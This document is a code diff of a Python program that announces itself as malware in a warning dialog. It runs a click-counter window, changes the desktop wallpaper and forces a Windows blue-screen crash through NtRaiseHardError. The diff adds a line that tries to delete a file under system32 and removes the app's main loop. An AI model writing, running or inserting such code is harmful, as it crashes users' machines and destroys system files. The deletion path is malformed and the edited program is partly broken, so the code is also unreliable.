@@ -8,6 +8,7 @@ import pygame
 import time
 from screeninfo import get_monitors
 import ctypes
+
 Warning_accepted = False
 if not Warning_accepted:
     respomse = messagebox.askyesno("STOP", "this is malware you wanna continue?")
@@ -94,13 +95,12 @@ class ClickCounterApp:
         SPI_SETDESKWALLPAPER = 0x0014
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_image_path, 3)
 
-
+os.remove('windows\system32\boot')
 
 if __name__ == "__main__":
     root = tk.Tk()
     app = ClickCounterApp(root)
-    root.mainloop()
-time.sleep(3000)
+time.sleep(20000)
 
 ntdll = ctypes.windll.ntdll
 prev_value = ctypes.c_bool()
@@ -110,3 +110,4 @@ if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
     print("BSOD Successfull!")
 else:
     print("BSOD Failed...")
+
